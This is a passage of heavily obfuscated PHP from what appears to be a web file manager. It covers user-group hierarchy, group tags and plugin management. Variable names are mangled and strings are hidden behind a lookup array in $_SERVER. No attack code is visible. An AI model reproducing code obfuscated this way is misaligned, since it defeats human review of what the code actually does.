$this->_listAppendMeta($Òø‘¡éµ, $Ø„îçÕò); $this->_listAppendParent($Òø‘¡éµ); $this->_listAppendSourceRoot($Òø‘¡éµ, $Ø„îçÕò); } private function _listAppendChildren(&$Å…õÇ•ü) { $°ÎÆ˜Ô =& $_SERVER[Š—Â“œÔ]; $€ú¨–Ú = array_to_keyvalue($Å…õÇ•ü, $°ÎÆ˜Ô[12], $°ÎÆ˜Ô[1971]); $ığµÀ³² = array($°ÎÆ˜Ô[192] => array($°ÎÆ˜Ô[7], $€ú¨–Ú)); $×·ºàåã = array($°ÎÆ˜Ô[192], $°ÎÆ˜Ô[2075] => $°ÎÆ˜Ô[567]); $‚ÔñØ°œ = $this->field($×·ºàåã)->where($ığµÀ³²)->group($°ÎÆ˜Ô[192])->select(); $ŸìÃÓŒí = array_to_keyvalue($‚ÔñØ°œ, $°ÎÆ˜Ô[192], $°ÎÆ˜Ô[567]); foreach ($Å…õÇ•ü as &$®ãø–¶«) { $Äıàã’æ = $®ãø–¶«[$°ÎÆ˜Ô[1971]]; $®ãø–¶«[$°ÎÆ˜Ô[2076]] = isset($ŸìÃÓŒí[$Äıàã’æ]) ? intval($ŸìÃÓŒí[$Äıàã’æ]) : !1; } unset($®ãø–¶«); } private function _listAppendChildrenMember(&$‰÷¯û½·) { $û”Å© =& $_SERVER[Š—Â“œÔ]; $Ü¸ìòÆ¨ = array_to_keyvalue($‰÷¯û½·, $û”Å©[12], $û”Å©[1971]); $¡ëÂø  = array($û”Å©[1971] => array($û”Å©[7], $Ü¸ìòÆ¨)); $¯±Ü»âı = array($û”Å©[1971], $û”Å©[2075] => $û”Å©[567]); $¢‰åíŸğ = Model($û”Å©[2065])->field($¯±Ü»âı)->where($¡ëÂø )->group($û”Å©[1971])->select(); $ã·—¨Ïè = array_to_keyvalue($¢‰åíŸğ, $û”Å©[1971], $û”Å©[567]); foreach ($‰÷¯û½· as &$ªĞ–şŞà) { $¢Í•ì’† = $ªĞ–şŞà[$û”Å©[1971]]; $ªĞ–şŞà[$û”Å©[2077]] = isset($ã·—¨Ïè[$¢Í•ì’†]) ? intval($ã·—¨Ïè[$¢Í•ì’†]) : !1; } unset($ªĞ–şŞà); } private function _listAppendMeta(&$ö´İš¦, $‹ÅÌµ—„) { $›Ñ¤åĞ¥ =& $_SERVER[Š—Â“œÔ]; $¼„éµÉ‰ = array($›Ñ¤åĞ¥[1971] => array($›Ñ¤åĞ¥[7], $‹ÅÌµ—„)); $çé¯à‘ö = Model($›Ñ¤åĞ¥[2064])->where($¼„éµÉ‰)->select(); $çé¯à‘ö = array_to_keyvalue_group($çé¯à‘ö, $›Ñ¤åĞ¥[1971]); foreach ($çé¯à‘ö as &$áÁûßæ†) { $áÁûßæ† = array_to_keyvalue($áÁûßæ†, $›Ñ¤åĞ¥[97], $›Ñ¤åĞ¥[452]); } unset($áÁûßæ†); foreach ($ö´İš¦ as &$“¼°Šìì) { $“¼°Šìì[$›Ñ¤åĞ¥[541]] = array(); if (isset($çé¯à‘ö[$“¼°Šìì[$›Ñ¤åĞ¥[1971]]])) { $“¼°Šìì[$›Ñ¤åĞ¥[541]] = $çé¯à‘ö[$“¼°Šìì[$›Ñ¤åĞ¥[1971]]]; } } unset($“¼°Šìì); } protected function parentLevelArray($õêì¹™) { $À†¯ï·´ =& $_SERVER[Š—Â“œÔ]; $õêì¹™ = explode($À†¯ï·´[50], trim($õêì¹™, $À†¯ï·´[50])); $õêì¹™ = array_remove_value($õêì¹™, $À†¯ï·´[230]); return $õêì¹™; } protected function parentInGroup($µâôÉ‰Ì, $“éá»Ö¬) { $ØøŒ‰ =& $_SERVER[Š—Â“œÔ]; $ÎËÃÆ‚õ = $this->getInfoSimple($µâôÉ‰Ì); if (!$ÎËÃÆ‚õ) { return !0; } $ò›ıßñå = $this->parentLevelArray($ÎËÃÆ‚õ[$ØøŒ‰[586]]); $ò›ıßñå[] = $µâôÉ‰Ì; foreach ($ò›ıßñå as $µâôÉ‰Ì) { if (in_array($µâôÉ‰Ì . $ØøŒ‰[12], $“éá»Ö¬)) { return !0; } } return !1; } private function _listAppendParent(&$Ğ×ÌÇê) { $†ŸºÔ¸º =& $_SERVER[Š—Â“œÔ]; $å¤Ùüƒİ = array(); foreach ($Ğ×ÌÇê as &$µÀ™Ïú) { $å¤Ùüƒİ[$µÀ™Ïú[$†ŸºÔ¸º[1971]]] = $µÀ™Ïú[$†ŸºÔ¸º[32]]; $æ·÷ú×ã = $this->parentLevelArray($µÀ™Ïú[$†ŸºÔ¸º[586]]); foreach ($æ·÷ú×ã as $¾ùÂ¢ıö) { if (!isset($å¤Ùüƒİ[$¾ùÂ¢ıö])) { $å¤Ùüƒİ[$¾ùÂ¢ıö] = 0; } } } unset($µÀ™Ïú); foreach ($å¤Ùüƒİ as $§ˆ€Âæ => $÷§áºúó) { if ($÷§áºúó) { continue; } $İËÂ³† = $this->getInfoSimple($§ˆ€Âæ); $å¤Ùüƒİ[$§ˆ€Âæ] = $İËÂ³†[$†ŸºÔ¸º[32]]; } $â€¾Î¨ = $GLOBALS[$†ŸºÔ¸º[6]][$†ŸºÔ¸º[92]][$†ŸºÔ¸º[2078]]; if (KodUser::isRoot()) { $â€¾Î¨ = !1; } foreach ($Ğ×ÌÇê as &$µÀ™Ïú) { $æ·÷ú×ã = $this->parentLevelArray($µÀ™Ïú[$†ŸºÔ¸º[586]]); $ÄèèßåÀ = $†ŸºÔ¸º[12]; foreach ($æ·÷ú×ã as $§ˆ€Âæ => $¾ùÂ¢ıö) { if ($â€¾Î¨ && $§ˆ€Âæ == 0) { continue; } $ÄèèßåÀ .= $å¤Ùüƒİ[$¾ùÂ¢ıö] . $†ŸºÔ¸º[8]; } if ($æ·÷ú×ã) { $ÄèèßåÀ .= $µÀ™Ïú[$†ŸºÔ¸º[32]]; } $µÀ™Ïú[$†ŸºÔ¸º[591]] = str_replace($†ŸºÔ¸º[256], $†ŸºÔ¸º[8], $ÄèèßåÀ); } unset($µÀ™Ïú); } private function _listAppendSourceRoot(&$ÇÕÏ¥ÚÀ, $´ÑûÊÔ) { $ˆà¶ñÍË =& $_SERVER[Š—Â“œÔ]; $’“Ÿú’û = Model($ˆà¶ñÍË[892])->listSourceRoot(SourceModel::TYPE_GROUP, $´ÑûÊÔ); $’“Ÿú’û = array_to_keyvalue($’“Ÿú’û, $ˆà¶ñÍË[571]); $’“Ÿú’û = array_remove_key($’“Ÿú’û, $ˆà¶ñÍË[571]); foreach ($ÇÕÏ¥ÚÀ as &$ú‹³¶”í) { $ú‹³¶”í[$ˆà¶ñÍË[90]] = $’“Ÿú’û[$ú‹³¶”í[$ˆà¶ñÍË[1971]]] ? $’“Ÿú’û[$ú‹³¶”í[$ˆà¶ñÍË[1971]]] : array(); } unset($ú‹³¶”í); } protected function groupMerge($À ¦ìÃ) { $À ¦ìÃ = array_values(array_unique($À ¦ìÃ)); $şúŒ½ÅÔ = array(); for ($øş‚ûá· = 0; $øş‚ûá· < count($À ¦ìÃ); $øş‚ûá·++) { $¢˜Ò…ôƒ = !1; for ($ìÏã› = 0; $ìÏã› < count($À ¦ìÃ); $ìÏã›++) { if ($øş‚ûá· == $ìÏã›) { continue; } if ($this->isParentOf($À ¦ìÃ[$ìÏã›], $À ¦ìÃ[$øş‚ûá·])) { $¢˜Ò…ôƒ = !0; break; } } if (!$¢˜Ò…ôƒ) { $şúŒ½ÅÔ[] = $À ¦ìÃ[$øş‚ûá·]; } } return $şúŒ½ÅÔ; } protected function isParentOf($ÑòÖÑ­, $€†˜¢Òâ) { $ªŠûĞÉŸ =& $_SERVER[Š—Â“œÔ]; if (!$ÑòÖÑ­ || !$€†˜¢Òâ || $ÑòÖÑ­ == $€†˜¢Òâ) { return !1; } $Çâ±¶› = $this->getInfoSimple($ÑòÖÑ­); $Ñ§°Ê¡ = $this->getInfoSimple($€†˜¢Òâ); $çËòµÅ¸ = $Çâ±¶›[$ªŠûĞÉŸ[586]] . $ÑòÖÑ­ . $ªŠûĞÉŸ[50]; if (substr($Ñ§°Ê¡[$ªŠûĞÉŸ[586]], 0, strlen($çËòµÅ¸)) == $çËòµÅ¸) { return !0; } return !1; } public function groupShowRoot($ø¦‹á•í, $œâ™ºÄò = false) { $ŸŞŒ³šÖ =& $_SERVER[Š—Â“œÔ]; $â“Åğ®ì = $this->getInfo($ø¦‹á•í); if (!$â“Åğ®ì) { return array(); } $½ÉÕæÂã = $this->parentLevelArray($â“Åğ®ì[$ŸŞŒ³šÖ[586]]); $¦†óãÁ = array($ø¦‹á•í); if (count($½ÉÕæÂã) == 0) { return $¦†óãÁ; } if ($œâ™ºÄò && count($½ÉÕæÂã) == 1) { return $¦†óãÁ; } if (!$â“Åğ®ì[$ŸŞŒ³šÖ[541]] || !isset($â“Åğ®ì[$ŸŞŒ³šÖ[541]][$ŸŞŒ³šÖ[2061]]) || $â“Åğ®ì[$ŸŞŒ³šÖ[541]][$ŸŞŒ³šÖ[2061]] == $ŸŞŒ³šÖ[843]) { return $this->groupShowRoot($½ÉÕæÂã[count($½ÉÕæÂã) - 1], $œâ™ºÄò); } if ($â“Åğ®ì[$ŸŞŒ³šÖ[541]][$ŸŞŒ³šÖ[2061]] == $ŸŞŒ³šÖ[434]) { $˜†Œ»Èç = explode($ŸŞŒ³šÖ[50], $â“Åğ®ì[$ŸŞŒ³šÖ[541]][$ŸŞŒ³šÖ[2062]]); if ($˜†Œ»Èç) { $¦†óãÁ = array_merge($¦†óãÁ, $˜†Œ»Èç); } } return $¦†óãÁ; } protected function resetParentLevel() { $¯£Ç›Şİ =& $_SERVER[Š—Â“œÔ]; $‹‹ààøš = $¯£Ç›Şİ[1971]; $Öø’´ƒä = $this->select(); $Öø’´ƒä = array_to_keyvalue($Öø’´ƒä, $‹‹ààøš); foreach ($Öø’´ƒä as $²óˆ¨ÚÒ) { $ØôÆ¹ëí = $²óˆ¨ÚÒ; $®êë™µ = array(); while ($ØôÆ¹ëí[$¯£Ç›Şİ[192]] != 0) { $®êë™µ[] = $ØôÆ¹ëí[$¯£Ç›Şİ[192]]; $ØôÆ¹ëí = $Öø’´ƒä[$ØôÆ¹ëí[$¯£Ç›Şİ[192]]]; } $®êë™µ[] = 0; $®êë™µ = $¯£Ç›Şİ[50] . implode($¯£Ç›Şİ[50], array_reverse($®êë™µ)) . $¯£Ç›Şİ[50]; $this->setNamePinyin($²óˆ¨ÚÒ[$‹‹ààøš], $²óˆ¨ÚÒ[$¯£Ç›Şİ[32]]); $this->where(array($‹‹ààøš => $²óˆ¨ÚÒ[$‹‹ààøš]))->save(array($¯£Ç›Şİ[657] => $®êë™µ)); } return $Öø’´ƒä; } public function groupNameAuto($‡‰–­Ğ®, $Öïô•œ±) { $õšİ¿ =& $_SERVER[Š—Â“œÔ]; $ÆÑ¦í†» = $this->where(array($õšİ¿[479] => $‡‰–­Ğ®))->getField($õšİ¿[32], !0); if (!$ÆÑ¦í†» || !in_array($Öïô•œ±, $ÆÑ¦í†»)) { return $Öïô•œ±; } for ($ƒ­Ùæä = 1; $ƒ­Ùæä <= count($ÆÑ¦í†») + 1; $ƒ­Ùæä++) { $¡ŞÓÅ”” = $Öïô•œ± . "\50{$ƒ­Ùæä}\x29"; if (!in_array($¡ŞÓÅ””, $ÆÑ¦í†»)) { return $¡ŞÓÅ””; } } } public function groupSwitch($øÓÂ§€à, $ªÛÆ€Ú) { $¶”ÅÙÂú =& $_SERVER[Š—Â“œÔ]; $—Ü¡…É = array($¶”ÅÙÂú[1971] => array($¶”ÅÙÂú[7], array($øÓÂ§€à, $ªÛÆ€Ú))); $á¡Ø•Øƒ = $this->where($—Ü¡…É)->select(); $á¡Ø•Øƒ = array_to_keyvalue($á¡Ø•Øƒ, $¶”ÅÙÂú[1971]); if (!isset($á¡Ø•Øƒ[$øÓÂ§€à]) || !isset($á¡Ø•Øƒ[$ªÛÆ€Ú]) || $á¡Ø•Øƒ[$øÓÂ§€à][$¶”ÅÙÂú[192]] == 0) { return !1; } $—Ü¡…É = array($¶”ÅÙÂú[1971] => $øÓÂ§€à); $ğÎàò¹š = Model($¶”ÅÙÂú[2065])->where($—Ü¡…É)->select(); if (!$ğÎàò¹š) { $ğÎàò¹š = array(); } foreach ($ğÎàò¹š as $“Ş˜Ò®¾) { $ßµ×„Û± = $“Ş˜Ò®¾[$¶”ÅÙÂú[1770]]; $—Ü¡…É = array($¶”ÅÙÂú[1770] => $ßµ×„Û±, $¶”ÅÙÂú[1971] => $ªÛÆ€Ú); $¦°‹¾è = Model($¶”ÅÙÂú[2065])->where($—Ü¡…É)->find(); if (!$¦°‹¾è) { $‘Ö‹ıÅç = array($ªÛÆ€Ú => $“Ş˜Ò®¾[$¶”ÅÙÂú[2079]]); Model($¶”ÅÙÂú[599])->userGroupAdd($ßµ×„Û±, $‘Ö‹ıÅç); } Model($¶”ÅÙÂú[599])->userGroupRemove($ßµ×„Û±, $øÓÂ§€à); } $—Ü¡…É = array($¶”ÅÙÂú[190] => 2, $¶”ÅÙÂú[192] => 0, $¶”ÅÙÂú[487] => 1, $¶”ÅÙÂú[571] => array($¶”ÅÙÂú[7], array($øÓÂ§€à, $ªÛÆ€Ú))); $×øç‹‰ = Model($¶”ÅÙÂú[892])->where($—Ü¡…É)->field($¶”ÅÙÂú[2080])->select(); $×øç‹‰ = array_to_keyvalue($×øç‹‰, $¶”ÅÙÂú[571], $¶”ÅÙÂú[193]); $ÚË¸ì = !empty($×øç‹‰[$øÓÂ§€à]) ? $×øç‹‰[$øÓÂ§€à] : !1; if ($ÚË¸ì) { if (!$×øç‹‰[$ªÛÆ€Ú]) { $×øç‹‰[$ªÛÆ€Ú] = Model($¶”ÅÙÂú[892])->groupRootAdd($ªÛÆ€Ú); } $Š²Šûª = $×øç‹‰[$ªÛÆ€Ú]; $—Ü¡…É = array($¶”ÅÙÂú[192] => $ÚË¸ì); $×øç‹‰ = Model($¶”ÅÙÂú[892])->where($—Ü¡…É)->field($¶”ÅÙÂú[2081])->select(); if (!$×øç‹‰) { $×øç‹‰ = array(); } Model($¶”ÅÙÂú[892])->moveClearAuth = !1; foreach ($×øç‹‰ as $¸¡¯´¢à) { $ØæñšıÈ = $¸¡¯´¢à[$¶”ÅÙÂú[487]] == $¶”ÅÙÂú[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¶”ÅÙÂú[892])->move($¸¡¯´¢à[$¶”ÅÙÂú[193]], $Š²Šûª, $ØæñšıÈ); } Model($¶”ÅÙÂú[892])->moveClearAuth = !0; $—Ü¡…É = array($¶”ÅÙÂú[190] => 2, $¶”ÅÙÂú[571] => $øÓÂ§€à); $ËßÚáú = array($¶”ÅÙÂú[571] => $ªÛÆ€Ú); Model($¶”ÅÙÂú[2082])->where($—Ü¡…É)->save($ËßÚáú); Model($¶”ÅÙÂú[2083])->where($—Ü¡…É)->save($ËßÚáú); } $this->_changeChildLevel($á¡Ø•Øƒ[$øÓÂ§€à], $á¡Ø•Øƒ[$ªÛÆ€Ú], !0); $this->where(array($¶”ÅÙÂú[192] => $øÓÂ§€à))->save(array($¶”ÅÙÂú[192] => $ªÛÆ€Ú)); $this->_clearChildrenCache($á¡Ø•Øƒ[$ªÛÆ€Ú]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($“à¬ĞŒ) { $¡»ñ¥ =& $_SERVER[Š—Â“œÔ]; return array($¡»ñ¥[2084] => array($“à¬ĞŒ[0], $¡»ñ¥[2085]), $¡»ñ¥[2086] => array($“à¬ĞŒ[0], $¡»ñ¥[2087])); } protected function get($Œ‘¶µœ) { $ğü‹õñ‰ =& $_SERVER[Š—Â“œÔ]; $‰å›€ü‘ = Model($ğü‹õñ‰[587])->metaGet($Œ‘¶µœ, $ğü‹õñ‰[2088]); $¾÷¨³¥Ê = json_decode($‰å›€ü‘, !0); return $¾÷¨³¥Ê ? $¾÷¨³¥Ê : array($ğü‹õñ‰[2089] => $ğü‹õñ‰[91], $ğü‹õñ‰[447] => array()); } protected function set($ÑÏÖÚËâ, $ÃÖ–Ÿ¹Ú) { $ëÚÓòá =& $_SERVER[Š—Â“œÔ]; $ÃÖ–Ÿ¹Ú = $ÃÖ–Ÿ¹Ú ? $ÃÖ–Ÿ¹Ú : array($ëÚÓòá[2089] => $ëÚÓòá[91], $ëÚÓòá[447] => array()); return Model($ëÚÓòá[587])->metaSet($ÑÏÖÚËâ, $ëÚÓòá[2088], json_encode($ÃÖ–Ÿ¹Ú)); } protected function getByTagID($Â¨èÜƒ, $÷¿¿Ü‘Ç) { $éôÛÄà€ =& $_SERVER[Š—Â“œÔ]; if (!$Â¨èÜƒ || !$÷¿¿Ü‘Ç) { return !1; } if (!Model($éôÛÄà€[587])->getInfoSimple($Â¨èÜƒ)) { return !1; } $½Éå´Ì = $this->get($Â¨èÜƒ); if (!$½Éå´Ì || !isset($½Éå´Ì[$éôÛÄà€[447]])) { return !1; } $Ğµ¶©æı = array_find_by_field($½Éå´Ì[$éôÛÄà€[447]], $éôÛÄà€[477], $÷¿¿Ü‘Ç); return is_array($Ğµ¶©æı) ? $Ğµ¶©æı : !1; } public function listSource($èâŸ¶Ì÷, $¯™Õ¼©õ) { $‡¬é½¤î =& $_SERVER[Š—Â“œÔ]; if ($¯™Õ¼©õ && !is_array($¯™Õ¼©õ)) { $¯™Õ¼©õ = array($¯™Õ¼©õ); } $Ğ¬­Ş = $this->listData($èâŸ¶Ì÷); $œ®‘Æçà = array(); foreach ($Ğ¬­Ş as $§áäëÁì) { $ÍßÈ½È = $§áäëÁì[$‡¬é½¤î[87]]; if (!$ÍßÈ½È) { continue; } if (!isset($œ®‘Æçà[$ÍßÈ½È])) { $œ®‘Æçà[$ÍßÈ½È] = array(); } $œ®‘Æçà[$ÍßÈ½È][] = $§áäëÁì[$‡¬é½¤î[502]]; } $úç€‰æ = array(); foreach ($œ®‘Æçà as $À›İÍ¶ => $„ÂÔ“à§) { $ªÅ„êÃÚ = !0; if (!$¯™Õ¼©õ) { $úç€‰æ[] = $À›İÍ¶; continue; } foreach ($¯™Õ¼©õ as $ÔƒĞİÊ¿) { if (!in_array($ÔƒĞİÊ¿, $„ÂÔ“à§)) { $ªÅ„êÃÚ = !1; break; } } if ($ªÅ„êÃÚ) { $úç€‰æ[] = $À›İÍ¶; } } if (!$úç€‰æ) { return array(); } $Ã‰¼Ç« = array($‡¬é½¤î[493] => array($‡¬é½¤î[494], $úç€‰æ), $‡¬é½¤î[571] => $èâŸ¶Ì÷, $‡¬é½¤î[190] => SourceModel::TYPE_GROUP); $®Òš¯‘­ = Model($‡¬é½¤î[1419])->listSource($Ã‰¼Ç«); if (!$®Òš¯‘­ || count($úç€‰æ) == $®Òš¯‘­[$‡¬é½¤î[444]][$‡¬é½¤î[445]]) { return $®Òš¯‘­; } $ÍûÉµÓŞ = array(); $óø‡€¯Ë = array_to_keyvalue($®Òš¯‘­[$‡¬é½¤î[85]], $‡¬é½¤î[12], $‡¬é½¤î[193]); $×Ş˜ˆé’ = array_to_keyvalue($®Òš¯‘­[$‡¬é½¤î[86]], $‡¬é½¤î[12], $‡¬é½¤î[193]); $†ñ™™›Œ = array_merge($×Ş˜ˆé’, $óø‡€¯Ë); foreach ($úç€‰æ as $ÍßÈ½È) { if (!in_array($ÍßÈ½È, $†ñ™™›Œ)) { $ÍûÉµÓŞ[] = $ÍßÈ½È; } } if ($ÍûÉµÓŞ) { $this->removeBySource($èâŸ¶Ì÷, $ÍûÉµÓŞ); } return $®Òš¯‘­; } protected function listData($“…ÎœÒç) { $ìƒ¸¤¡« =& $_SERVER[Š—Â“œÔ]; $—šŠ„©« = array($ìƒ¸¤¡«[1761] => 0, $ìƒ¸¤¡«[559] => array($ìƒ¸¤¡«[2090], 0), $ìƒ¸¤¡«[498] => $ìƒ¸¤¡«[2091] . $“…ÎœÒç); $…ãõ Ş = $ìƒ¸¤¡«[2092]; $‚Â‹Á³ = $this->field($…ãõ Ş)->where($—šŠ„©«)->order($ìƒ¸¤¡«[2093])->select(); return $‚Â‹Á³ ? $‚Â‹Á³ : array(); } protected function addToTag($äŸŒŒÎ, $»şú‹Áı, $„ÖıÖ¶) { $åƒæØ“Ù =& $_SERVER[Š—Â“œÔ]; if (!$this->getByTagID($äŸŒŒÎ, $„ÖıÖ¶) || !$»şú‹Áı) { return !1; } if (!Model($åƒæØ“Ù[892])->pathInfo($»şú‹Áı)) { return !1; } $É»Õ«¦Í = array($åƒæØ“Ù[1761] => 0, $åƒæØ“Ù[559] => $„ÖıÖ¶, $åƒæØ“Ù[497] => $»şú‹Áı, $åƒæØ“Ù[498] => $åƒæØ“Ù[2094] . $äŸŒŒÎ, $åƒæØ“Ù[496] => $åƒæØ“Ù[12], $åƒæØ“Ù[1975] => 0); if ($this->where($É»Õ«¦Í)->find()) { return !1; } return $this->add($É»Õ«¦Í); } protected function removeFromTag($¸ÇÛãÁ, $òã¤îÛ, $¼É´½à) { $“ßÂÑŞ› =& $_SERVER[Š—Â“œÔ]; if (!$this->getByTagID($¸ÇÛãÁ, $¼É´½à) || !$òã¤îÛ) { return !1; } if (is_array($òã¤îÛ)) { $òã¤îÛ = array($“ßÂÑŞ›[7], $òã¤îÛ); } $¿‰‡¼úğ = array($“ßÂÑŞ›[1761] => 0, $“ßÂÑŞ›[559] => $¼É´½à, $“ßÂÑŞ›[498] => $“ßÂÑŞ›[2094] . $¸ÇÛãÁ, $“ßÂÑŞ›[497] => $òã¤îÛ); return $this->where($¿‰‡¼úğ)->delete(); } protected function removeByTag($‰°ëİù‡, $ÖªùŠä) { $’Ì¶šõü =& $_SERVER[Š—Â“œÔ]; if (!$this->getByTagID($‰°ëİù‡, $ÖªùŠä)) { return !1; } $ãóÜÈ€ = array($’Ì¶šõü[1761] => 0, $’Ì¶šõü[559] => $ÖªùŠä, $’Ì¶šõü[498] => $’Ì¶šõü[2094] . $‰°ëİù‡); return $this->where($ãóÜÈ€)->delete(); } protected function removeBySource($¥ã’Ğ“™, $Î…ãé•) { $Ñ·‡‚˜Ê =& $_SERVER[Š—Â“œÔ]; if (!$¥ã’Ğ“™ || !$Î…ãé•) { return !1; } if (is_array($Î…ãé•)) { $Î…ãé• = array($Ñ·‡‚˜Ê[7], $Î…ãé•); } $³Ç™¥°Ú = array($Ñ·‡‚˜Ê[1761] => 0, $Ñ·‡‚˜Ê[497] => $Î…ãé•, $Ñ·‡‚˜Ê[559] => array($Ñ·‡‚˜Ê[1088], 0), $Ñ·‡‚˜Ê[498] => $Ñ·‡‚˜Ê[2094] . $¥ã’Ğ“™); return $this->where($³Ç™¥°Ú)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\x70\154\x75\x67\x69\x6e\114\151\163\164"; public $field = array("\x6e\141\155\145", "\x73\x74\141\x74\165\x73", "\162\145\147\x69\x65\163\x74", "\143\x6f\x6e\146\x69\147"); public function loadList($Ò¢¶­´Â = false) { $¶şÕ¾ò† = array_to_keyvalue($this->listData(), $_SERVER[Š—Â“œÔ][32]); if ($Ò¢¶­´Â) { return $¶şÕ¾ò†[$Ò¢¶­´Â]; } return $¶şÕ¾ò†; } public function init() { $É“½ºû =& $_SERVER[Š—Â“œÔ]; Hook::trigger($É“½ºû[2095]); $èì’ñƒ = $this->loadPluginList(); foreach ($èì’ñƒ as $¹›õÎ¶³ => $’³ş¨Õ‘) { $à“»îš = $this->appAllow($¹›õÎ¶³, $’³ş¨Õ‘); if (!$à“»îš) { continue; } foreach ($’³ş¨Õ‘[$É“½ºû[2096]] as $ê–Ü¼– => $¿Ó¬ñÖš) { Hook::bind($ê–Ü¼–, $¿Ó¬ñÖš); } } Hook::trigger($É“½ºû[2097]); Hook::trigger(ACTION); } public function appAllow($‹ü¤‹Íë, $†µÎ‡ÈÄ, $••ğĞÜ‚ = true) { $¦‡ÄÆƒş =& $_SERVER[Š—Â“œÔ]; $ •ûõ ’ = PLUGIN_DIR . $‹ü¤‹Íë . $¦‡ÄÆƒş[2098]; if (!is_array($†µÎ‡ÈÄ) || !is_array($†µÎ‡ÈÄ[$¦‡ÄÆƒş[2096]]) || $†µÎ‡ÈÄ[$¦‡ÄÆƒş[817]] != 1 || !is_file($ •ûõ ’)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¦‡ÄÆƒş[6]][$¦‡ÄÆƒş[2099]] || !$GLOBALS[$¦‡ÄÆƒş[6]][$¦‡ÄÆƒş[2100]]) { return !0; } $ı²®ş = explode($¦‡ÄÆƒş[50], strtolower($GLOBALS[$¦‡ÄÆƒş[6]][$¦‡ÄÆƒş[2100]])); return in_array(strtolower($‹ü¤‹Íë), $ı²®ş) ? !1 : !0; } if ($••ğĞÜ‚ && !Action($¦‡ÄÆƒş[2101])->checkAuth($‹ü¤‹Íë)) { return !1; } return !0; } public function unInstall($éÑÍ…ÏÍ) { $¡ø®ë– =& $_SERVER[Š—Â“œÔ]; $°ÜêŞœò = $this->loadList($éÑÍ…ÏÍ); if (file_exists(PLUGIN_DIR . $éÑÍ…ÏÍ)) { Hook::apply($éÑÍ…ÏÍ . $¡ø®ë–[2102]); } $this->remove($°ÜêŞœò[$¡ø®ë–[477]]); } public function changeStatus($ç„‘ƒÅ, $éî‘¥¾Ù) { $ĞÒ¡Â†¦ =& $_SERVER[Š—Â“œÔ]; $ØÙÆàÒ = $this->loadList($ç„‘ƒÅ); if ($éî‘¥¾Ù) { Hook::apply($ç„‘ƒÅ . $ĞÒ¡Â†¦[2103]); } $this->update($ØÙÆàÒ[$ĞÒ¡Â†¦[477]], array($ĞÒ¡Â†¦[2104] => $éî‘¥¾Ù)); } public function appRegist($ÕÜöüğÛ, $˜ë›ñ¡æ) { $¦ıôÙÎí =& $_SERVER[Š—Â“œÔ]; $¶²Şó¢ = $this->loadList($ÕÜöüğÛ); if ($¶²Şó¢) { $this->update($¶²Şó¢[$¦ıôÙÎí[477]], array($¦ıôÙÎí[2096] => $˜ë›ñ¡æ)); } else { $¨¦É¯°ô = array($¦ıôÙÎí[32] => $ÕÜöüğÛ, $¦ıôÙÎí[2096] => $˜ë›ñ¡æ, $¦ıôÙÎí[817] => 0, $¦ıôÙÎí[6] => $this->getConfigDefault($ÕÜöüğÛ)); $this->insert($¨¦É¯°ô); } } public function getConfigDefault($Œæ®²î) { $»ùí¼‹¬ =& $_SERVER[Š—Â“œÔ]; $‚œí—·« = array(); $¨†ãİµ´ = $this->getPackageJson($Œæ®²î); if (!$¨†ãİµ´ && is_array($¨†ãİµ´[$»ùí¼‹¬[2105]])) { return $‚œí—·«; } foreach ($¨†ãİµ´[$»ùí¼‹¬[2105]] as $¬ù¼ˆÚ => $Ğ·Ä·´è) { if (!isset($Ğ·Ä·´è[$»ùí¼‹¬[452]]) || isset($‚œí—·«[$¬ù¼ˆÚ])) { continue; } $‚œí—·«[$¬ù¼ˆÚ] = $Ğ·Ä·´è[$»ùí¼‹¬[452]]; } return $‚œí—·«; } public function getPackageJson($¤±Û«’Í) { return Hook::apply($¤±Û«’Í . $_SERVER[Š—Â“œÔ][2106]); } public function getConfig($«Ê¦Ç›£, $åš¤‚À÷ = false) { $ÉÅ‡µ­ =& $_SERVER[Š—Â“œÔ]; $Íù–åÔ = array(); $Ï×ø½Ã = $this->loadList($«Ê¦Ç›£); if ($Ï×ø½Ã && is_array($Ï×ø½Ã[$ÉÅ‡µ­[6]])) { $Íù–åÔ = $Ï×ø½Ã[$ÉÅ‡µ­[6]]; } if (!$Íù–åÔ || $åš¤‚À÷) { $Íù–åÔ = $this->getConfigDefault($«Ê¦Ç›£); } return $Íù–åÔ; } public function setConfig($š¦ä¿ğô, $ıÆ¦æÏâ = false) { $Œò¦Æ˜ƒ =& $_SERVER[Š—Â“œÔ]; $åÛüéêÕ = $this->loadList($š¦ä¿ğô); if (!$åÛüéêÕ) { return !1; } $Ğø±°ÈÃ = $åÛüéêÕ[$Œò¦Æ˜ƒ[6]]; if ($ıÆ¦æÏâ == !1) { $Ğø±°ÈÃ = array(); $ıÆ¦æÏâ = $this->getConfigDefault($š¦ä¿ğô); } foreach ($ıÆ¦æÏâ as $ÛÛò“°‡ => $—î§ˆØ›) { $Ğø±°ÈÃ[$ÛÛò“°‡] = is_string($—î§ˆØ›) ? trim($—î§ˆØ›) : $—î§ˆØ›; } $this->update($åÛüéêÕ[$Œò¦Æ˜ƒ[477]], array($Œò¦Æ˜ƒ[6] => $Ğø±°ÈÃ)); } public function viewList() { $ÔÌ¼÷ëº =& $_SERVER[Š—Â“œÔ]; $˜ª”ï¨ú = $this->loadList(); $this->pluginScan($˜ª”ï¨ú); $˜ª”ï¨ú = $this->loadPluginList(); $£ÆÏÊîô = array(); foreach ($˜ª”ï¨ú as $ÇÒîŠ„ã => $ŒÛø‡ˆë) { $¥¡êëÔ = $ŒÛø‡ˆë; unset($ŒÛø‡ˆë[$ÔÌ¼÷ëº[2096]], $ŒÛø‡ˆë[$ÔÌ¼÷ëº[6]]); $ûŠ€õõô = PLUGIN_DIR . $ŒÛø‡ˆë[$ÔÌ¼÷ëº[32]] . $ÔÌ¼÷ëº[2098]; if (!is_file($ûŠ€õõô)) { continue; } $ªÆøğåñ = Hook::apply($ŒÛø‡ˆë[$ÔÌ¼÷ëº[32]] . $ÔÌ¼÷ëº[2106]); if (!is_array($ªÆøğåñ)) { continue; } $£ÆÏÊîô[$ÇÒîŠ„ã] = array_merge($ŒÛø‡ˆë, $ªÆøğåñ); if ($¥¡êëÔ[$ÔÌ¼÷ëº[6]][$ÔÌ¼÷ëº[1683]] != $ªÆøğåñ[$ÔÌ¼÷ëº[1657]]) { 